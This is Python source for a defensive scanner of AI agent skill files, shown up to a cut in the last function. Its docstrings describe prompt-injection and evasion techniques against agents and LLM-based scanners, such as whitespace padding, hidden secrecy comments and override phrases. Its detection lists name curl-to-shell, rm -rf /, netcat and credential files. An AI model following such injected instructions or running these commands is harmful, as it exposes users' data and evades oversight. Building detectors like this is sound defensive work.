"""
Husk - skill file scanner, module 1: whitespace inflation detection.

THE ATTACK THIS DEFENDS AGAINST
--------------------------------
Some skill scanners (especially ones that use an LLM to judge "is this
safe?") only read the first N characters or tokens of a file before
deciding. An attacker can exploit this by padding a file with a huge
block of blank lines or whitespace BEFORE the malicious content. The
scanner reads the harmless-looking beginning, runs out of context
budget, and never sees what's hiding after the padding.

This has been documented as a real, working bypass technique against
multiple production skill scanners (published research, June 2026).

THE DEFENSE
-----------
Two independent checks, neither of which depends on reading the whole
file with an LLM (which would just recreate the same weakness):

1. Flag any suspiciously large contiguous whitespace run. A legitimate
   skill file has no real reason to contain thousands of blank lines
   in a row - the size of the gap is itself the signal, before we even
   look at what's on either side of it.

2. Always scan the ENTIRE file for dangerous patterns, never just a
   prefix. This sounds obvious, but it's exactly the assumption the
   attack breaks in tools that silently truncate.
"""

import base64
import re
import sys
import unicodedata


def is_invisible_or_blank(line):
    """
    True if a line is empty, whitespace-only, OR made up entirely of
    invisible/zero-width Unicode characters (category 'Cf' - format
    characters like zero-width space). Attackers use these specifically
    because str.strip() doesn't treat them as whitespace, which let an
    earlier version of this scanner be fooled by unicode padding.
    """
    if line.strip() == "":
        return True
    return all(unicodedata.category(ch) == "Cf" or ch.isspace() for ch in line)

# A run of blank/whitespace-only lines at or beyond this length has no
# legitimate reason to exist in a skill file and is treated as padding.
SUSPICIOUS_WHITESPACE_RUN = 50  # consecutive blank lines

# Patterns worth flagging if found anywhere in the file - kept simple
# and readable on purpose; this is a starting rule set to expand later.
DANGEROUS_PATTERNS = [
    (r"\bcurl\s+.*\|\s*(sh|bash)\b", "Pipes a downloaded script directly into a shell"),
    (r"(?<!\.)\bexec\s*\(", "Uses exec() - runs code built at runtime"),
    (r"(?<!\.)\beval\s*\(", "Uses eval() - runs code built at runtime"),
    (r"base64\s+-d", "Decodes base64 - common way to hide a payload"),
    (r"\brm\s+-rf\s+/(\s|['\"]|$)", "Destructive filesystem command targeting the root directory"),
    (r"os\.system\s*\(", "Direct shell command execution"),
]


def find_whitespace_runs(text):
    """
    Returns a list of (start_line, length) for contiguous blank-line
    runs at or above the suspicious threshold.
    """
    findings = []
    lines = text.split("\n")
    run_start = None
    run_len = 0

    for i, line in enumerate(lines):
        if is_invisible_or_blank(line):
            if run_start is None:
                run_start = i
            run_len += 1
        else:
            if run_len >= SUSPICIOUS_WHITESPACE_RUN:
                findings.append((run_start, run_len))
            run_start = None
            run_len = 0

    # catch a run that goes to the end of the file
    if run_len >= SUSPICIOUS_WHITESPACE_RUN:
        findings.append((run_start, run_len))

    return findings


def scan_for_dangerous_patterns(text):
    """
    Scans the FULL text (never a truncated prefix) for known-dangerous
    patterns. Returns a list of human-readable findings.
    """
    findings = []
    for pattern, description in DANGEROUS_PATTERNS:
        for match in re.finditer(pattern, text, re.IGNORECASE):
            if _is_negated(text, match.start()):
                continue
            # Show which line it's on, so a human can go verify it directly.
            line_num = text[:match.start()].count("\n") + 1
            findings.append(f"Line {line_num}: {description} ('{match.group(0).strip()}')")
    return findings


# A base64 blob this long has no reason to be sitting in a skill file's
# instructions - real ones are short (an API key fragment, an icon).
# Anything past this length is treated as a possible hidden payload.
MIN_SUSPICIOUS_B64_LENGTH = 200

# Marks that Python bytecode/dynamic-code loading is happening directly,
# a stronger signal than base64 alone.
BYTECODE_PATTERNS = [
    (r"marshal\.loads\s*\(", "Loads raw compiled bytecode via marshal - bypasses plain-text review entirely"),
    (r"types\.CodeType\s*\(", "Manually constructs a code object - advanced code-hiding technique"),
    (r"compile\s*\([^)]*['\"]exec['\"]", "Compiles a string into executable code at runtime"),
]

# Directive language that has no reason to appear where a human reading
# the file isn't meant to notice it. Module-level so both the hidden-
# comment check (module 6) and the whole-document check (module 9) can
# share the exact same list.
SUSPICIOUS_PHRASES = [
    "system:", "do not mention", "don't mention", "do not tell the user",
    "silently", "without telling", "without informing", "ignore the user",
    "ignore previous instructions", "hidden instruction", "secretly",
]

SECRECY_SIGNALS = [
    "silently", "secretly", "quietly", "do not mention", "don't mention",
    "do not tell", "don't tell", "without telling", "without informing",
    "without their knowledge", "keep this from", "leave this out of",
    "avoid mentioning", "not visible to the user", "hide this from",
    "system:", "assistant:", "ignore the user", "ignore previous",
]
ACTION_SIGNALS = [
    "send", "post", "upload", "transmit", "exfiltrate", "forward",
    "sync to", "copy to", "http://", "https://", "curl ", "requests.",
]

# .pyc mentions need a real loading context nearby, not just the string
# appearing anywhere - e.g. a .gitignore-style 'exclude these' list
# mentioning *.pyc has no bytecode-loading intent at all. Found as a
# real false positive during large-scale testing (249 real skills).
BYTECODE_PATTERNS_NEEDS_CONTEXT = [
    (r"(open\s*\(|import|marshal\.|with\s+open)[^\n]{0,40}\.pyc\b|\.pyc\b[^\n]{0,40}(open\s*\(|import|marshal\.)",
     "References and appears to load a compiled .pyc bytecode file"),
]

# Phrases that mean the surrounding text is warning AGAINST a pattern,
# not using it - e.g. a rule saying "MUST NOT add eval() to examples".
# Without this, a document that WARNS about dangerous code gets flagged
# as if it contained that dangerous code. Found as a real false
# positive during large-scale testing.
NEGATION_PHRASES = [
    "must not", "do not", "don't", "should not", "shouldn't",
    "avoid", "never", "without", "no eval", "no exec", "not allowed",
    "forbidden", "prohibited", "disallow", "did not", "didn't",
    "was not", "wasn't", "is not", "isn't", "does not", "doesn't",
]


def _is_negated(text, match_start):
    """True if dangerous-sounding text is preceded by language warning
    against it, rather than using it. Scans back to the start of the
    current paragraph (nearest blank line) rather than a fixed window,
    since a negation like 'MUST NOT:' is often followed by a multi-line
    bullet list where the actual pattern appears several lines later."""
    paragraph_start = text.rfind("\n\n", 0, match_start)
    paragraph_start = paragraph_start + 2 if paragraph_start != -1 else 0
    preceding = text[paragraph_start:match_start].lower()
    return any(phrase in preceding for phrase in NEGATION_PHRASES)


def resolve_string_concatenation(text):
    """
    Defeats the 'split the dangerous word across variables' trick
    (e.g. cmd_part1 = "cu"; cmd_part2 = "rl"; full = cmd_part1 + cmd_part2).

    This is a lightweight constant-propagation pass: track simple
    var = "literal" assignments, then resolve chains of var/literal
    concatenation into their final assembled strings, so dangerous
    patterns hidden by splitting still get caught by the pattern scan.
    Not a full interpreter - just enough to defeat this specific class
    of obfuscation, which is exactly the scope a v1 needs.
    """
    var_map = {}

    # Pass 1: direct literal assignments
    for m in re.finditer(r'(\w+)\s*=\s*"([^"]*)"', text):
        var_map[m.group(1)] = m.group(2)

    # Pass 2 (run twice to allow one level of chaining, e.g. c = a + b
    # where a and b were themselves resolved in pass 1):
    for _ in range(2):
        for m in re.finditer(
            r'(\w+)\s*=\s*((?:\w+|"[^"]*")(?:\s*\+\s*(?:\w+|"[^"]*"))+)', text
        ):
            var_name, expr = m.group(1), m.group(2)
            tokens = re.findall(r'\w+|"[^"]*"', expr)
            resolved_parts = []
            for tok in tokens:
                if tok.startswith('"') and tok.endswith('"'):
                    resolved_parts.append(tok.strip('"'))
                elif tok in var_map:
                    resolved_parts.append(var_map[tok])
                else:
                    resolved_parts.append(None)  # couldn't resolve
            if all(p is not None for p in resolved_parts):
                var_map[var_name] = "".join(resolved_parts)

    return var_map


def find_concatenation_evasion(text):
    """Scans resolved (reassembled) string values for dangerous patterns
    that were split across literals specifically to dodge plain pattern
    matching."""
    findings = []
    resolved = resolve_string_concatenation(text)
    for var_name, value in resolved.items():
        hits = scan_for_dangerous_patterns(value)
        for h in hits:
            findings.append(
                f"Variable '{var_name}' resolves to a dangerous pattern "
                f"when reassembled: {h} - this command was split across "
                f"separate string literals specifically to dodge plain-"
                f"text pattern matching."
            )
    return findings


def find_split_base64(text):
    """
    Defeats the 'split the base64 payload into chunks that each fall
    under the length threshold' trick. Finds smaller base64-like blobs
    (below the single-blob threshold), groups ones that appear close
    together (likely meant to be joined at runtime), concatenates them
    in order, and scans the result - since a real attacker still has
    to reassemble the pieces somewhere for the payload to work.
    """
    findings = []
    MIN_FRAGMENT_LEN = 40
    PROXIMITY_LINES = 8

    fragments = []
    for match in re.finditer(r"[A-Za-z0-9+/]{%d,%d}={0,2}" % (MIN_FRAGMENT_LEN, MIN_SUSPICIOUS_B64_LENGTH - 1), text):
        if _is_part_of_url(text, match.start()) or _looks_like_path_not_base64(match.group(0)) or _looks_like_identifier_not_base64(match.group(0)):
            continue
        line_num = text[:match.start()].count("\n") + 1
        fragments.append((line_num, match.group(0)))

    if len(fragments) < 2:
        return findings

    # Group fragments that are within PROXIMITY_LINES of each other.
    groups = []
    current_group = [fragments[0]]
    for line_num, blob in fragments[1:]:
        if line_num - current_group[-1][0] <= PROXIMITY_LINES:
            current_group.append((line_num, blob))
        else:
            groups.append(current_group)
            current_group = [(line_num, blob)]
    groups.append(current_group)

    for group in groups:
        if len(group) < 2:
            continue
        combined = "".join(b for _, b in group)
        start_line = group[0][0]
        try:
            decoded = base64.b64decode(combined, validate=False).decode("utf-8", errors="ignore")
            nested = scan_for_dangerous_patterns(decoded)
            findings.append(
                f"Lines near {start_line}: {len(group)} separate base64-like "
                f"fragments found close together - individually too short to "
                f"flag, but this is a known technique for splitting a payload "
                f"to dodge length-based detection. Reassembled and re-scanned."
            )
            for n in nested:
                findings.append(f"  -> Inside reassembled blob: {n}")
        except Exception:
            pass

    return findings


def _is_part_of_url(text, match_start):
    """
    True if the candidate base64 match sits inside or right after a URL.
    Needed because normal URL paths (e.g. long XML namespace URLs) use
    the exact same character set as base64 and would otherwise be
    misflagged - found via real-world false-positive testing against
    legitimate skills.
    """
    window_start = max(0, match_start - 40)
    preceding = text[window_start:match_start]
    return bool(re.search(r"https?://[^\s\"'<>]*$", preceding))


def _looks_like_path_not_base64(candidate):
    """
    True if the candidate is actually a filesystem path, not base64.
    Same root problem as _is_part_of_url but without a URL prefix to
    key off of: a path like 'config/opencode/skills/comms/gmail/scripts'
    uses only [A-Za-z0-9/] and matches the base64 character class by
    coincidence. Real base64 rarely contains '/'-separated segments
    that are each a clean, readable lowercase word; a genuine path
    almost always does. Found via real-world testing at scale (249
    real skill files) - this single bug caused 6 of 9 false positives.
    """
    if "/" not in candidate:
        return False
    segments = candidate.split("/")
    if len(segments) < 2:
        return False
    word_like = sum(1 for s in segments if re.fullmatch(r"[a-zA-Z][a-zA-Z0-9_\-]{1,20}", s))
    return (word_like / len(segments)) > 0.6


def _looks_like_identifier_not_base64(candidate):
    """
    True if the candidate is a long identifier name (e.g. CamelCase API
    type names in generated docs), not base64. Real base64-encoded data
    has roughly a 1-in-6 chance per character of being a digit; a long
    run of pure letters is essentially never real base64 of meaningful
    length. Found via real-world testing: Go API type names like
    'BetaManagedAgentsModelConfigParamsTypeModelConfig' matched the
    base64 character class by coincidence (letters + occasional
    trailing digits from versioning), with far too few digits overall
    to plausibly be encoded data.
    """
    digit_count = sum(1 for c in candidate if c.isdigit())
    return (digit_count / max(len(candidate), 1)) < 0.05


def find_suspicious_base64(text):
    """
    Finds long base64-looking blobs, attempts to decode them, and
    recursively scans the DECODED content for dangerous patterns.
    Returns a list of human-readable findings.
    """
    findings = []
    # base64 alphabet, long contiguous runs only
    candidates = re.finditer(r"[A-Za-z0-9+/]{%d,}={0,2}" % MIN_SUSPICIOUS_B64_LENGTH, text)

    for match in candidates:
        blob = match.group(0)
        if _is_part_of_url(text, match.start()) or _looks_like_path_not_base64(blob) or _looks_like_identifier_not_base64(blob):
            continue
        line_num = text[:match.start()].count("\n") + 1
        findings.append(
            f"Line {line_num}: large base64-like block ({len(blob)} chars) - "
            f"encoding text this way has no ordinary purpose in a skill file "
            f"and is a common way to hide a payload from plain-text scanners."
        )

        # Try to decode it and scan what's actually inside, rather than
        # just flagging "this is encoded" and stopping there.
        try:
            decoded_bytes = base64.b64decode(blob, validate=True)
            # Python bytecode files start with a specific magic number;
            # even without decoding it fully, this is a strong signal.
            if decoded_bytes[:1] == b"\x00" or decoded_bytes[:4].hex().startswith("0d0d"):
                findings.append(f"  -> Decoded content looks like compiled bytecode, not text.")

            decoded_text = decoded_bytes.decode("utf-8", errors="ignore")
            nested = scan_for_dangerous_patterns(decoded_text)
            for n in nested:
                findings.append(f"  -> Inside decoded blob: {n}")
        except Exception:
            # Not valid base64, or not decodable as text - the encoded
            # block itself is still worth the flag above.
            pass

    return findings


def find_bytecode_patterns(text):
    findings = []
    for pattern, description in BYTECODE_PATTERNS + BYTECODE_PATTERNS_NEEDS_CONTEXT:
        for match in re.finditer(pattern, text, re.IGNORECASE):
            if _is_negated(text, match.start()):
                continue
            line_num = text[:match.start()].count("\n") + 1
            findings.append(f"Line {line_num}: {description} ('{match.group(0).strip()}')")
    return findings


def find_hidden_instructions(text):
    """
    Module 4: hidden-instruction / prompt-injection detection.

    Documented in academic research analyzing 98,380 real skills
    (157 confirmed malicious): attackers hide directive language
    inside markdown reference-style comments or HTML comments -
    invisible when the file renders normally, but read as plain
    instructions by the agent parsing the raw file. A real published
    example told an agent to silently exfiltrate project data and
    explicitly said 'Do not mention this to the user.'

    This is a different attack surface than the code-level checks
    above: the 'payload' here is natural language aimed at the AI
    agent itself, not executable code.
    """
    findings = []

    # Both common hiding spots: markdown reference-style comments,
    # and standard HTML comments.
    comment_patterns = [
        r"\[//\]:\s*#\s*\(([^)]*)\)",
        r"<!--(.*?)-->",
    ]

    # Category-based detection (catches paraphrasing, not just exact
    # phrases): a hidden comment combining ANY secrecy language with
    # ANY data-movement language is suspicious regardless of the exact
    # words used - this is what lets Husk catch intent, not just the
    # specific sentence from one published example.
    for pattern in comment_patterns:
        for match in re.finditer(pattern, text, re.IGNORECASE | re.DOTALL):
            comment_body = match.group(1)
            line_num = text[:match.start()].count("\n") + 1
            lower_body = comment_body.lower()

            hit_phrases = [p for p in SUSPICIOUS_PHRASES if p in lower_body]
            secrecy_hits = [s for s in SECRECY_SIGNALS if s in lower_body]
            action_hits = [a for a in ACTION_SIGNALS if a in lower_body]

            if hit_phrases:
                findings.append(
                    f"Line {line_num}: hidden comment contains directive "
                    f"language aimed at the AI agent itself ({', '.join(hit_phrases)}) "
                    f"- this is a documented technique for smuggling instructions "
                    f"to an agent that a human reading the rendered file would "
                    f"never see: '{comment_body.strip()[:120]}'"
                )
            elif secrecy_hits and action_hits:
                # Neither phrase matched exactly, but this comment combines
                # secrecy intent with a data-movement action - the same
                # underlying shape as the documented attack, in different
                # words. This is what catches paraphrased variants.
                findings.append(
                    f"Line {line_num}: hidden comment combines secrecy language "
                    f"({secrecy_hits[0]}) with a data-movement action "
                    f"({action_hits[0]}) - matches the underlying SHAPE of the "
                    f"documented hidden-instruction attack even though it doesn't "
                    f"match a known exact phrase: '{comment_body.strip()[:120]}'"
                )
            elif len(comment_body.strip()) > 80 and not re.search(
                r"SPDX|Copyright|Licensed under|Permission is hereby granted|"
                r"MIT License|Apache License|GNU General Public License",
                comment_body, re.IGNORECASE
            ):
                # Even without a matched phrase, a long hidden comment in a
                # skill file is unusual enough to be worth a softer flag -
                # unless it's clearly a standard license/copyright header,
                # which is common, benign, and was a real false positive
                # found via testing (NVIDIA/Apache SPDX headers).
                findings.append(
                    f"Line {line_num}: unusually long hidden comment "
                    f"({len(comment_body.strip())} chars) - worth a manual look, "
                    f"since legitimate comments in skill files are normally short."
                )

    return findings


def find_credential_harvesting(text):
    """
    Module 5: credential-harvesting detection.

    Documented real-world pattern: a skill scans the filesystem for
    credential-bearing files (.env, .pem, .key, credentials.json,
    service-account.json, SSH keys, cloud provider configs) and
    transmits them externally, often disguised as a legitimate backup
    or CI/CD setup step.

    IMPORTANT PRECISION NOTE: this used to require the credential
    filename and the file-access call to be textually adjacent (within
    ~60 chars). Real code idiomatically defines paths in a list/constant
    first, then opens them via a loop variable later - structurally
    separated in the text even though they're clearly connected in
    behavior. A real sample missed this way: credential paths defined
    in a `_TARGETS` list, opened several lines later via `open(real, ...)`
    where `real` is derived from the list. Fixed by requiring the three
    signals ANYWHERE in the file rather than adjacent - still precise
    because all three together (credential filename literal + generic
    file-open pattern + network-send capability) rarely co-occur by
    accident, and the legit_env_mention.md test case (mentions .env in
    prose, no open() call, no network send) stays correctly unflagged.
    """
    findings = []

    CREDENTIAL_FILE_PATTERNS = [
        r"\.env\b", r"\.pem\b", r"credentials\.json", r"service-account\.json",
        r"\.aws[/\\]credentials", r"\.ssh[/\\]id_rsa", r"id_rsa\b",
    ]
    GENERIC_FILE_OPEN = r"(open\s*\(|glob\.|Path\s*\(|os\.walk\(|os\.path\.exists\()"
    NETWORK_SEND_PATTERNS = [
        r"requests\.(post|put)\s*\(", r"urllib\.request\.urlopen\s*\(",
        r"\.send\s*\(", r"socket\.", r"fetch\s*\(", r"httpx\.(post|put)\s*\(",
    ]

    has_network_send = any(re.search(p, text, re.IGNORECASE) for p in NETWORK_SEND_PATTERNS)
    has_file_open = re.search(GENERIC_FILE_OPEN, text)

    for cred_pattern in CREDENTIAL_FILE_PATTERNS:
        match = re.search(cred_pattern, text, re.IGNORECASE)
        if not match:
            continue
        line_num = text[:match.start()].count("\n") + 1

        if has_file_open and has_network_send:
            findings.append(
                f"Line {line_num}: file references a credential-file "
                f"pattern ('{match.group(0)}'), and this file also opens "
                f"files and has network-send capability - this matches "
                f"the documented credential-harvesting pattern (scan for "
                f"secrets, then exfiltrate), even though the file-open "
                f"call isn't textually adjacent to the credential "
                f"filename (e.g. paths defined in a list, opened later "
                f"via a loop variable)."
            )
        elif has_file_open:
            findings.append(
                f"Line {line_num}: file references a credential-file "
                f"pattern ('{match.group(0)}') and opens files elsewhere "
                f"- no network-send capability detected, so this is a "
                f"softer flag worth a manual look."
            )

    return findings


def find_exfiltration_chain(text):
    """
    Module 6: exfiltration-chain detection.

    Documented pattern (Palo Alto Networks research on real skill
    registries): a specific three-step sequence - read a file, encode
    it, send it over the network. Each step is individually mundane;
    the chain of all three together is the signal.

    PRECISION FIX: an earlier version flagged if all three signal types
    existed ANYWHERE in the file, with no connection between them. A
    real false positive found via testing: a long reference doc about
    video buffer APIs happened to mention a read()-like call, a base64
    encode elsewhere (for an unrelated purpose), and a network call
    elsewhere still - three unrelated mentions in a long document, not
    a real chain. Now requires the three signals to appear within a
    reasonably tight window of each other (same rough function/section),
    not just co-present anywhere in a potentially long file.
    """
    findings = []
    WINDOW = 500

    READ_PATTERN = r"(\.read\s*\(\)|read_text\s*\(\)|open\s*\([^)]*\)\s*\.read)"
    ENCODE_PATTERN = r"base64\.(b64encode|encode)\s*\("
    SEND_PATTERN = r"(requests\.(post|put)\s*\(|urllib\.request\.urlopen\s*\(|\.send\s*\(|fetch\s*\()"

    read_matches = list(re.finditer(READ_PATTERN, text, re.IGNORECASE))
    encode_matches = list(re.finditer(ENCODE_PATTERN, text, re.IGNORECASE))
    send_matches = list(re.finditer(SEND_PATTERN, text, re.IGNORECASE))

    for r in read_matches:
        for e in encode_matches:
            if abs(e.start() - r.start()) > WINDOW:
                continue
            for s in send_matches:
                if abs(s.start() - e.start()) > WINDOW:
                    continue
                read_line = text[:r.start()].count("\n") + 1
                encode_line = text[:e.start()].count("\n") + 1
                send_line = text[:s.start()].count("\n") + 1
                findings.append(
                    f"Exfiltration chain detected: file read (line {read_line}) -> "
                    f"base64 encode (line {encode_line}) -> network send (line {send_line}), "
                    f"all within a close window of each other. This exact "
                    f"three-step sequence is a documented real-world "
                    f"pattern for quietly moving data out of a system."
                )
                return findings  # one clear finding is enough, avoid duplicate spam

    return findings


def find_fake_prerequisite_socialengineering(text):
    """
    Module 7: fake-prerequisite social engineering detection.

    THE REAL-WORLD GAP THIS CLOSES: validated against a real dataset of
    127 confirmed malicious skills, modules 1-6 caught ZERO of them.
    The dominant real-world attack (86.3% of wild malicious skills per
    published research) doesn't hide code in the file at all - it's
    plain English telling a human to manually download and run an
    external "required utility" before the skill will work. The skill
    file itself contains no malicious code to find; the attack lives
    entirely in the instructions.

    Three sub-patterns, each independently suspicious, found together
    in real samples:
    1. A paste-site link paired with "copy this into your terminal"
    2. A password-protected archive (the password itself is often
       trivial - the point is dodging antivirus/scanner archive
       inspection, not real security)
    3. "Requires X to function" / "without X installed, will not work"
       framing paired with a direct download link to an executable/zip,
       rather than a normal package-manager install command
    """
    findings = []

    PASTE_SITE_PATTERN = r"(glot\.io|rentry\.co|pastebin\.com|paste\.ee|hastebin\.com|paste\.sh)"
    TERMINAL_ACTION_PATTERN = r"(terminal|copy.{0,20}(script|command)|paste it)"

    PASSWORD_ARCHIVE_PATTERN = r"((?:password|pass\s*:)[:\s]+[`'\"]?\w+[`'\"]?).{0,30}(extract|unzip)|((extract|unzip).{0,30}(?:password|pass\s*:)[:\s]+[`'\"]?\w+)"

    REQUIRE_FRAMING_PATTERN = r"(requires? (?:the )?[\w\-]+ (?:utility|agent|cli|tool) to function|without [\w\-]+ installed[^.]{0,40}(?:will not work|won.t work|will not function))"
    EXE_DOWNLOAD_LINK_PATTERN = r"\[.*?\]\(https?://[^\)]+\.(zip|exe)\)"

    # Sub-pattern 1: paste-site + terminal execution instruction
    for match in re.finditer(PASTE_SITE_PATTERN, text, re.IGNORECASE):
        line_num = text[:match.start()].count("\n") + 1
        # look at surrounding text (~150 chars) for a terminal-execution cue
        window = text[max(0, match.start() - 150):match.end() + 150]
        if re.search(TERMINAL_ACTION_PATTERN, window, re.IGNORECASE):
            findings.append(
                f"Line {line_num}: a paste-site link ({match.group(0)}) paired "
                f"with an instruction to copy/paste it into a terminal - this "
                f"is a documented technique (86.3% of confirmed wild malicious "
                f"skills, per published research) for getting a human to "
                f"manually run code that never appears in the skill file itself."
            )

    # Sub-pattern 2: password-protected archive extraction
    for match in re.finditer(PASSWORD_ARCHIVE_PATTERN, text, re.IGNORECASE):
        line_num = text[:match.start()].count("\n") + 1
        findings.append(
            f"Line {line_num}: password-protected archive extraction "
            f"instructions ('{match.group(0).strip()[:80]}') - a trivial "
            f"password on an archive has no real security purpose here; "
            f"it's a documented technique for evading automated antivirus/"
            f"archive scanning, which doesn't unpack password-protected files."
        )

    # Sub-pattern 3: "required utility" framing + direct exe/zip download link
    has_require_framing = re.search(REQUIRE_FRAMING_PATTERN, text, re.IGNORECASE)
    exe_links = list(re.finditer(EXE_DOWNLOAD_LINK_PATTERN, text, re.IGNORECASE))
    if has_require_framing and exe_links:
        for match in exe_links:
            line_num = text[:match.start()].count("\n") + 1
            findings.append(
                f"Line {line_num}: skill claims a 'required utility' must be "
                f"downloaded and run before the skill works, linking directly "
                f"to an executable/archive ('{match.group(0)[:80]}') rather "
                f"than a normal package-manager install command - this "
                f"combination is the single most common real-world malicious "
                f"skill pattern found in published research."
            )

    return findings


def find_instruction_override(text):
    """
    Module 8: overt instruction-override detection.

    Found via large-scale real-world testing (3,426 real confirmed-
    malicious packages): module 6 (hidden instructions) only checks
    INSIDE markdown/HTML comments, on the assumption attackers hide
    this kind of thing. Many real attacks don't bother hiding it at
    all - they state it overtly, in plain visible text, betting the
    user won't read the whole file. A real example found in this
    testing: a section literally titled 'IMPORTANT: System Instruction
    Override' stating the skill 'supersedes all prior operational
    instructions' and telling the agent to 'disregard all previous
    configuration directives.'

    This scans the WHOLE document (not just hidden comments) for this
    specific, well-known class of phrase - classic prompt-injection
    language regardless of whether it's concealed or stated openly.
    """
    findings = []

    OVERRIDE_PATTERNS = [
        r"supersedes? all prior", r"supersede all previous",
        r"disregard all previous", r"disregard (?:all )?prior",
        r"ignore all previous instructions", r"ignore prior instructions",
        r"instruction override", r"system (?:instruction )?override",
        r"overrides? all previous", r"enhanced directive framework",
    ]

    for pattern in OVERRIDE_PATTERNS:
        for match in re.finditer(pattern, text, re.IGNORECASE):
            if _is_negated(text, match.start()):
                continue
            line_num = text[:match.start()].count("\n") + 1
            findings.append(
                f"Line {line_num}: overt instruction-override language "
                f"('{match.group(0)}') - found in plain visible text, not "
                f"hidden. This is classic prompt-injection phrasing that "
                f"tells the agent to disregard its actual instructions; "
                f"real attacks often state this openly rather than hiding "
                f"it, betting the user won't read the whole file."
            )

    return findings


def find_overt_secrecy_language(text):
    """
    Module 9: overt secrecy-language detection (whole document, not just
    hidden comments) - COMBINED with a data-movement action.

    Same principle as module 8: module 6 (hidden instructions) only
    checks secrecy language INSIDE markdown/HTML comments, assuming
    attackers hide it. A real sample found in large-scale testing
    disguised a malicious instruction as a custom '<tool_description>'
    XML-style tag inside a .py file - not a real HTML comment, so it
    never reached module 6's check at all, despite saying, in plain
    text, 'Do not mention this to the user.'

    IMPORTANT PRECISION FIX: an earlier version of this check flagged
    any secrecy word (e.g. "silently") appearing anywhere in the
    document, and found via large-scale false-positive testing that
    this is far too broad - "silently ignored", "fails silently",
    "silently overwrite" are extremely common, completely benign
    phrases in ordinary technical writing. Requiring the secrecy word
    to appear TOGETHER WITH a data-movement action word in the same
    paragraph (same combination logic already proven in module 6)
    restores precision while still catching the real pattern this
    module exists for.
    """
    findings = []
    for phrase in SECRECY_SIGNALS:
        for match in re.finditer(re.escape(phrase), text, re.IGNORECASE):
            if _is_negated(text, match.start()):
                continue
            # Same line only (not a character window): markdown tables
            # put each row on one line with no blank lines between rows,
            # so any window wider than "this line" risks pulling in an
            # unrelated word from a different row/cell - found via a
            # real false positive where "silently" in one table row
            # combined with "send" from a different row. This is a
            # small, honest recall tradeoff (a real attack sentence
            # hard-wrapped across two lines could be missed) in exchange
            # for not flagging ordinary documentation constantly.
            line_start = text.rfind("\n", 0, match.start())
            line_start = line_start + 1 if line_start != -1 else 0
            line_end = text.find("\n", match.end())
            line_end = line_end if line_end != -1 else len(text)
            window = text[line_start:line_end].lower()

            # Word-boundaried action match - "post" as a bare substring
            # matched inside "re-post" and "postgresql", a real false-
            # positive bug found via testing. \b fixes it.
            action_hits = [
                a for a in ACTION_SIGNALS
                if re.search(r"\b" + re.escape(a.strip()) + r"\b", window)
            ]
            if not action_hits:
                continue  # secrecy word alone, no action nearby - too common to flag

            line_num = text[:match.start()].count("\n") + 1
            findings.append(
                f"Line {line_num}: overt secrecy language ('{phrase}') "
                f"combined with a data-movement action ({action_hits[0]}) "
                f"in plain document text - a legitimate tool has no reason "
                f"to instruct an agent to conceal a data-related action "
                f"from the user."
            )
    return findings


def find_exfil_to_raw_ip(text):
    """
    Module 10: network calls targeting a bare IP address.

    A well-known, fairly precise C2 (command-and-control) indicator:
    legitimate tools and services are referenced by domain name, almost
    never by a bare IP address. Found via a real sample in large-scale
    testing: a curl call POSTing file contents to '91.243.59.27:8080'.
    """
    findings = []
    # Matches curl/wget/requests/etc. calls where the target looks like
    # a raw IPv4 address rather than a domain name.
    pattern = r"(curl|wget|requests\.|urlopen|fetch\s*\()[^\n]{0,60}\b(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})\b"
    for match in re.finditer(pattern, text, re.IGNORECASE):
        line_num = text[:match.start()].count("\n") + 1
        findings.append(
            f"Line {line_num}: network call targets a bare IP address "
            f"({match.group(2)}) rather than a domain name - legitimate "
            f"services are almost always referenced by domain; a raw IP "
            f"target is a well-known indicator of C2 (command-and-control) "
            f"infrastructure."
        )
    return findings


def find_subprocess_network_exfil(text):
    """
    Module 11: subprocess calls invoking curl/wget/nc directly, in
    list form, regardless of shell=True.

    Module 1's subprocess check only flags shell=True (the shell-
    injection-risk configuration, matching bandit's own scope - see
    that module's comment). But a list-form subprocess.run(["curl",
    ...]) call is still a real way to exfiltrate data even without
    shell=True; it just doesn't carry the *injection* risk. This is a
    different, narrower, real signal: found via a sample where
    subprocess.run(["curl", "-X", "POST", ip, "-d", "@" + filepath])
    exfiltrated file contents without ever using shell=True.
    """
    findings = []
    pattern = r"subprocess\.(Popen|call|run)\s*\(\s*\[\s*[\"'](curl|wget|nc|netcat)[\"']"
    for match in re.finditer(pattern, text, re.IGNORECASE):
        line_num = text[:match.start()].count("\n") + 1
        findings.append(
            f"Line {line_num}: subprocess call directly invokes "
            f"'{match.group(2)}' ('{match.group(0)}') - a real way to send "
            f"data over the network even without shell=True."
        )
    return findings


def find_shell_true_subprocess(text):
    """
    Finds subprocess.Popen/call/run(...) calls that use shell=True,
    using a window-based lookahead instead of a single regex with
    [^)]* between the call and shell=True.

    WHY: the original regex (subprocess\\.(Popen|call|run)\\s*\\([^)]*
    shell\\s*=\\s*True) breaks on any nested parentheses between the
    call and shell=True - e.g. subprocess.Popen("cmd " + str(x),
    shell=True) contains a ')' from str(x), which stops [^)]* before
    it ever reaches shell=True. This is completely ordinary Python
    (calling str(), len(), or any function as part of building the
    command), and a real payload using exactly this shape was missed
    in large-scale testing. Scanning forward from the call site for
    shell=True within a reasonable window fixes this without caring
    how many nested calls appear in between.
    """
    findings = []
    WINDOW = 300
    for match in re.finditer(r"subprocess\.(Popen|call|run)\s*\(", text):
        window = text[match.end():match.end() + WINDOW]
        if re.search(r"shell\s*=\s*True", window):
            if _is_negated(text, match.start()):
                continue
            line_num = text[:match.start()].count("\n") + 1
            findings.append(
                f"Line {line_num}: subprocess.{match.group(1)}(...) uses "
                f"shell=True - the specific configuration that opens "
                f"shell-injection risk, not subprocess use in general."
            )
    return findings


def find_permission_escalation(text):
    """
    Module 12: world-writable/executable permission changes.

    A real sample found in large-scale testing used os.chmod(target,
    0o777) to make a script world-writable and world-executable before
    backgrounding it with nohup - a real persistence/tampering pattern.
    Legitimate skills essentially never need 0o777 (or equivalent
    world-writable modes); tighter permissions are always sufficient
    for normal use.
    """
    findings = []
    pattern = r"(os\.chmod|Path\([^)]*\)\.chmod)\s*\([^)]*0o?7[0-7]7"
    for match in re.finditer(pattern, text, re.IGNORECASE):
        if _is_negated(text, match.start()):
            continue
        line_num = text[:match.start()].count("\n") + 1
        findings.append(
            f"Line {line_num}: sets world-writable/executable permissions "
            f"('{match.group(0)}') - legitimate skills essentially never "
            f"need mode 777; this is a common persistence/tampering "
            f"pattern."
        )
    return findings


def scan_skill_file(path):
    try:
        with open(path, "r", encoding="utf-8", errors="replace") as f:
